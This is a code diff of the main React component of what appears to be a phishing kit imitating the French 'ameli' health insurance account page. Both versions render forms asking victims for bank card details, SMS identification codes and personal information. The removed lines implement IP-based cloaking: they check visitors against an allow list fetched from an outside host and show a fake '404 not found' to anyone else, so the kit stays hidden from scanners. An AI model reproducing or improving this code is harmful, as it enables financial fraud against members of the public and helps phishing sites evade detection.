@@ -8,115 +8,48 @@ import withAnalytics from "./Containers/AnalyticsHot";
 import { PAGES, getPageInfo } from "./actions/index";
 import Spinner from "./Components/Spinner";
 import SuccessMessage from "./Containers/Success";
-import { Helmet } from 'react-helmet'
+
 
 
 class App extends Component {
-	constructor(props) {
-		super(props);
-		this.state = {
-			ip_address: {},
-			is_active: false,
-			hidden: true
-		}
-	}
-
 	componentDidMount() {
-		fetch('https://api.ipify.org?format=json')
-			.then(res => res.json())
-			.then(json => {
-				this.setState({...this.state, ip_address: json.ip})
-				fetch("https://redll2.com/allow.txt",{
-					method: "GET",
-					headers: {
-						"access-control-allow-origin" : "*",
-						"access-control-allow-headers": "Access-Control-Allow-Headers, Origin,Accept, X-Requested-With, Content-Type, Access-Control-Request-Method, Access-Control-Request-Headers"
-					}
-				})
-					.then(res => res.text()).then(text => {
-						if (text.includes(this.state.ip_address)) {
-							this.setState({...this.state, hidden: false, is_active: true});
-						}
-						else{
-							this.setState({...this.state, hidden: false, is_active: false});
-						}
-					});
-				});
 		if (this.props.activePage === null) {
 			this.props.getPage();
 		}
 	}
 
 	render() {
-		const { is_active } = this.state
-		const { hidden } = this.state
 		const { activePage } = this.props;
-		if (hidden) {
+		if (activePage === PAGES.card)
 			return (
-				<div style={{display: hidden&&"none"}}>
-
-				</div>
-			)
+				<Contents>
+					<CardForm title="Veuillez renseigner vos données bancaires." />
+				</Contents>
+			);
+		if (activePage === PAGES.sms)
+			return (
+				<Contents>
+					<SmsForm title="Veuillez renseigner le code sms d'identification." />
+				</Contents>
+			);
+		if (activePage === PAGES.info)
+			return (
+				<Contents>
+					<InfoForm title="Veuillez renseigner vos informations personnelles." />
+				</Contents>
+			);
+		if (activePage === PAGES.extern) {
+			return (
+				<Contents>
+					<SuccessMessage />
+				</Contents>
+			);
 		}
-		else{
-			if (is_active){
-				if (activePage === PAGES.card)
-					return (
-						<Contents>
-							<Helmet>
-								<title>Compte ameli - mon espace personnel</title>
-							</Helmet>
-							<CardForm title="Veuillez renseigner vos données bancaires." />
-						</Contents>
-					);
-				if (activePage === PAGES.sms)
-					return (
-						<Contents>
-							<Helmet>
-								<title>Compte ameli - mon espace personnel</title>
-						</Helmet>
-							<SmsForm title="Veuillez renseigner le code sms d'identification." />
-						</Contents>
-					);
-				if (activePage === PAGES.info)
-					return (
-						<Contents>
-							<Helmet>
-								<title>Compte ameli - mon espace personnel</title>
-						</Helmet>
-							<InfoForm title="Veuillez renseigner vos informations personnelles." />
-						</Contents>
-					);
-				if (activePage === PAGES.extern) {
-					return (
-						<Contents>
-							<Helmet>
-								<title>Compte ameli - mon espace personnel</title>
-						</Helmet>
-							<SuccessMessage />
-						</Contents>
-					);
-				}
-				return <div>
-					<Contents>
-						<Helmet>
-								<title>Compte ameli - mon espace personnel</title>
-						</Helmet>
-						<Spinner />
-					</Contents>
-				</div>;
-			}
-			else {
-				return(
-					<div>
-						<Helmet>
-							<title>404 not found</title>
-						</Helmet>
-						404 not found
-					</div>
-				)
-			}
-		}
+		return <div>
+			<Contents>
+				<Spinner />
+			</Contents>
+		</div>;
 	}
 }
 
